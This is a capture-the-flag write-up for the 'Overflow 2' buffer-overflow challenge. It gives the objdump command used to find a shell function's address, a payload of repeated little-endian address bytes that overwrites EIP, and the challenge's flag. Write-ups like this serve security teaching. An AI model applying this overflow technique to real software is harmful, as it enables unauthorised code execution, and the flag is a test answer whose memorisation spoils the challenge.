#Overflow 2 - 70
This problem has a buffer overflow vulnerability! Can you get a shell? You can solve this problem interactively here, and the source can be found here.

## Solution (with interactive solver)
1. Find the address of the function we want to call using `objdump -d overflow2 | grep "shell"`

2. Covert that into it's little endian and then printable values `\xad\x84\x04\x08`

3. Fill up the buffer until you've filled the eip register with the address you want to call `\xad\x84\x04\x08\xad\x84\x04\x08\xad\x84\x04\x08\xad\x84\x04\x08\xad\x84\x04\x08\xad\x84\x04\x08\xad\x84\x04\x08\xad\x84\x04\x08\xad\x84\x04\x08`

4. This gives us root, so then it's a case of `ls` and `cat flag.txt`

5. Giving us the flag `controlling_%eip_feels_great`
